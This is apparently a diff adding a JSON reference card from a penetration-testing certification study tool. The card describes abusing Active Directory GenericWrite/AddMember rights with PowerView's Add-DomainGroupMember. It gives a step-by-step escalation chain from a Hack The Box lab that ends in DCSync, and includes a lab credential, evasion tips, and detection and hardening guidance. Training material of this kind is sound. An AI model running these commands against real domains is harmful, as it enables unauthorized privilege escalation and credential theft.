@@ -1,0 +1,96 @@
+{
+  "id": "ad-acl-addgroupmember",
+  "name": "PowerView - Abuse GenericWrite/AddMember ACL",
+  "command": "Add-DomainGroupMember -Identity '<group>' -Members '<user>' -Credential $Cred -Verbose",
+  "description": "Adds a user to a group using GenericWrite, AddSelf, or AddMember rights on the group object. If your controlled account (damundsen) has GenericWrite over a group (Help Desk Level 1), you can add any account to that group \u2014 including accounts that then inherit further rights. Core step in multi-hop ACL escalation chains.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "acl-abuse",
+    "powerview",
+    "genericwrite",
+    "group-membership",
+    "dacl"
+  ],
+  "mitre": [
+    "T1098"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== RIGHTS THAT ENABLE GROUP MEMBERSHIP ABUSE ===\n  GenericWrite    \u2192 write any non-protected attribute on the object\n                    (includes group membership attribute 'member')\n  AddSelf         \u2192 user can add themselves specifically to the group\n  AddMember       \u2192 can add any account to the group\n  GenericAll      \u2192 all of the above\n\n=== WHY THIS IS POWERFUL IN CHAINS ===\nGroups in AD often inherit rights from their parent or hold rights on other objects.\nExample chain from Module 13:\n  wley \u2192 ForceChangePassword \u2192 damundsen\n  damundsen \u2192 GenericWrite \u2192 'Help Desk Level 1' group  [this card]\n  Help Desk Level 1 \u2192 AddSelf \u2192 'IT Admins' group       [this card again]\n  IT Admins \u2192 WriteDACL \u2192 Domain object\n  \u2192 Grant yourself DCSync \u2192 secretsdump everything\n\nAdding to groups is how you traverse these chains.\n\n=== FULL PROCEDURE FOR THE LAB CHAIN ===\n# 1. Set up damundsen credential (after ForceChangePassword)\n$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword2)\n\n# 2. Add damundsen to Help Desk Level 1 (GenericWrite on group)\nAdd-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\n# 3. Verify membership\nGet-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName\n\n# 4. Now Help Desk Level 1 member can add self to IT Admins (AddSelf)\n# Create a fake user credential or use damundsen who is now in Help Desk Level 1\nAdd-DomainGroupMember -Identity 'IT Admins' -Members 'damundsen' -Credential $Cred2 -Verbose\n\n=== DETECTION ===\nGroup membership changes generate Event 4728 (global group member added) or\n4732 (local group member added). Monitored by Tier 0 incident response teams\nbut often missed for lower-privilege groups.\n\n=== CLEANUP (IF NEEDED) ===\nRemove-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 Also covered in: OSCP PEN-200 Chapter 21 (Active Directory Introduction and Enumeration).",
+  "examples": [
+    {
+      "label": "Add to group with GenericWrite",
+      "command": "Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose"
+    },
+    {
+      "label": "Verify membership",
+      "command": "Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName"
+    },
+    {
+      "label": "Remove from group (cleanup)",
+      "command": "Remove-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose"
+    },
+    {
+      "label": "Ch21 \u2014 net group add (GenericAll on group via native net command)",
+      "command": "net group \"<group_name>\" <username> /add /domain"
+    },
+    {
+      "label": "Ch21 \u2014 net group remove (cleanup after GenericAll abuse)",
+      "command": "net group \"<group_name>\" <username> /del /domain"
+    }
+  ],
+  "references": [
+    {
+      "title": "PowerView (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "An ACE Up the Sleeve",
+      "url": "https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 - Active Directory Introduction and Enumeration",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-secretsdump-dcsync",
+      "rel": "next",
+      "note": "If added to a DCSync-capable group, dump the domain."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Abuses GenericWrite/AddMember (Add-DomainGroupMember) to add a controlled account to a privileged group, inheriting its rights.",
+    "prerequisites": "Write/AddMember rights over the target group.",
+    "impact": "Membership in a privileged group (e.g. a group with DA-equivalent rights) - escalation.",
+    "detection": "[MITRE T1098] Event 4728/4732/4756 (member added to a security group) where the actor isn't an admin; a change to a privileged group.",
+    "artifacts": "Group-membership-change events; the added account.",
+    "prevention": "Audit group-write ACLs; alert on privileged-group membership changes (4728/4732); remove self after use is still logged.",
+    "evasion": "Remove the membership after use to limit the window (the add is logged regardless); target a less-watched privileged group.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1098"
+    ],
+    "misconfiguration": "Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.",
+    "vulnerable_config": "# Example: a help-desk group has ForceChangePassword on Domain Admins members\n# Found via BloodHound 'ForceChangePassword' edge, or PowerView:\nGet-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |\n  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n\n# Another dangerous pattern \u2014 GenericWrite on a user (enables targeted Kerberoasting):\nGet-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}",
+    "secure_config": "# 1. Run AD ACL audit quarterly (automated):\n# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users\n# PowerView batch:\nGet-DomainObjectAcl -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |\n  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |\n  Export-Csv acl_review.csv\n\n# 2. Remove dangerous ACEs:\nRemove-DomainObjectAcl -TargetIdentity 'svc_sql' \\\n    -PrincipalIdentity 'helpdesk' -Rights GenericWrite\n\n# 3. Enable AD Protected Users group for privileged accounts\n# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius"
+  },
+  "tools": [
+    "PowerView"
+  ]
+}
